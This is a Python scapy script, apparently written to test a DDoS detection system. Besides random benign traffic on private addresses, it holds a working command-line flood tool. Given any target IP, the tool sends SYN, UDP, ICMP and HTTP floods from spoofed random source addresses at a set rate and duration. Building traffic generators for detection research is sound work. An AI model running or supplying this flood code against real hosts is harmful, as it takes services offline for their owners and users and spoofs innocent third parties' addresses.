"""
Traffic Generator for DDoS Detection

This module generates both benign and attack traffic for testing the DDoS detection system.
"""
import random
import time
import threading
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether

class TrafficGenerator:
    """Generates network traffic for testing DDoS detection."""
    
    def __init__(self, target_ip=None, target_port=80, duration=60):
        """
        Initialize the traffic generator.
        
        Args:
            target_ip: Target IP address for attack traffic
            target_port: Target port for attack traffic
            duration: Duration of traffic generation in seconds
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = False
        self.threads = []
    
    def start_benign_traffic(self, count=1000):
        """
        Generate benign network traffic.
        
        Args:
            count: Number of packets to generate
        """
        self.running = True
        print(f"Generating {count} benign packets...")
        
        for _ in range(count):
            if not self.running:
                break
                
            # Random source and destination IPs in private ranges
            src_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            dst_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Random protocol (TCP/UDP/ICMP)
            protocol = random.choice(["tcp", "udp", "icmp"])
            
            if protocol == "tcp":
                sport = random.randint(1024, 65535)
                dport = random.choice([80, 443, 22, 21, 25])  # Common ports
                packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="S")
            elif protocol == "udp":
                sport = random.randint(1024, 65535)
                dport = random.choice([53, 123, 161, 500])  # Common UDP ports
                packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=dport)
            else:  # ICMP
                packet = IP(src=src_ip, dst=dst_ip) / ICMP()
            
            send(packet, verbose=0)
            time.sleep(random.uniform(0.01, 0.1))  # Random delay between packets
    
    def start_ddos_attack(self, attack_type="syn", rate=1000):
        """
        Generate DDoS attack traffic.
        
        Args:
            attack_type: Type of DDoS attack (syn, udp, icmp, http)
            rate: Packets per second
        """
        if not self.target_ip:
            raise ValueError("Target IP not specified for DDoS attack")
            
        self.running = True
        print(f"Starting {attack_type.upper()} flood attack on {self.target_ip}")
        
        def attack():
            while self.running and time.time() < end_time:
                if attack_type == "syn":
                    self._send_syn_flood()
                elif attack_type == "udp":
                    self._send_udp_flood()
                elif attack_type == "icmp":
                    self._send_icmp_flood()
                elif attack_type == "http":
                    self._send_http_flood()
                time.sleep(1.0 / rate)  # Control packet rate
        
        end_time = time.time() + self.duration
        thread = threading.Thread(target=attack)
        self.threads.append(thread)
        thread.start()
    
    def _send_syn_flood(self):
        """Send SYN flood packets."""
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        sport = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags="S")
        send(packet, verbose=0)
    
    def _send_udp_flood(self):
        """Send UDP flood packets."""
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        sport = random.randint(1024, 65535)
        payload = "X" * 100  # 100-byte payload
        packet = IP(src=src_ip, dst=self.target_ip) / UDP(sport=sport, dport=self.target_port) / payload
        send(packet, verbose=0)
    
    def _send_icmp_flood(self):
        """Send ICMP flood packets."""
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        packet = IP(src=src_ip, dst=self.target_ip) / ICMP() / ("X" * 56)  # 64-byte total
        send(packet, verbose=0)
    
    def _send_http_flood(self):
        """Send HTTP flood packets."""
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        sport = random.randint(1024, 65535)
        http_request = (
            f"GET /{random.randint(1, 1000)} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n\r\n"
        )
        packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=sport, dport=80, flags="PA") / http_request
        send(packet, verbose=0)
    
    def stop(self):
        """Stop all traffic generation."""
        self.running = False
        for thread in self.threads:
            thread.join()
        print("Traffic generation stopped")


def generate_benign_traffic(duration=60, count=1000):
    """Generate benign traffic for the specified duration."""
    generator = TrafficGenerator(duration=duration)
    try:
        generator.start_benign_traffic(count)
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        generator.stop()


def generate_ddos_attack(target_ip, attack_type="syn", duration=60, rate=1000):
    """Generate DDoS attack traffic."""
    generator = TrafficGenerator(target_ip=target_ip, duration=duration)
    try:
        generator.start_ddos_attack(attack_type, rate)
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        generator.stop()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Network Traffic Generator for DDoS Testing")
    subparsers = parser.add_subparsers(dest='command', help='Command to run')
    
    # Benign traffic command
    benign_parser = subparsers.add_parser('benign', help='Generate benign traffic')
    benign_parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    benign_parser.add_argument('-c', '--count', type=int, default=1000, help='Number of packets to generate')
    
    # DDoS attack command
    attack_parser = subparsers.add_parser('attack', help='Generate DDoS attack traffic')
    attack_parser.add_argument('target', help='Target IP address')
    attack_parser.add_argument('-t', '--type', choices=['syn', 'udp', 'icmp', 'http'], 
                              default='syn', help='Type of attack')
    attack_parser.add_argument('-d', '--duration', type=int, default=60, 
                              help='Duration in seconds')
    attack_parser.add_argument('-r', '--rate', type=int, default=1000, 
                              help='Packets per second')
    
    args = parser.parse_args()
    
    if args.command == 'benign':
        generate_benign_traffic(args.duration, args.count)
    elif args.command == 'attack':
        generate_ddos_attack(args.target, args.type, args.duration, args.rate)
    else:
        parser.print_help()
